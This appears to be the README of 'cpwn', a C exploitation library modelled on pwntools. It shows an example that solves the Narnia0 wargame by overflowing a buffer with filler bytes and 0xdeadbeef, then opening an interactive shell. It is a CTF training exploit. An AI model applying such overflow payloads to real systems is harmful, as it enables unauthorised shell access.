# cpwn


```c
#include "includes/cpwn.h"

void narnia0() {
    // Spawn process
    Tube* p = pwn_process("./narnia0");

    // Almost all strings in cpwn are handled by a custom dynamic string library `str`, which 
    // can handle binary safe strings (null terminator \x00 is threated like a regular char).
    // Below expression builds a payload. str_load() is a function which bundles multiple str pointers
    // Both str_new and pwn_64 returns a str*
    str* payload = str_load(
        str_new("KKKKKKKKKKKKKKKKKKKK"),
        pwn_p64(0xdeadbeef, "little")
    ); 

    // Send payload to process
    pwn_sendline(p, payload);

    // Spawn an interactive shell
    pwn_interactive(p);
}
```
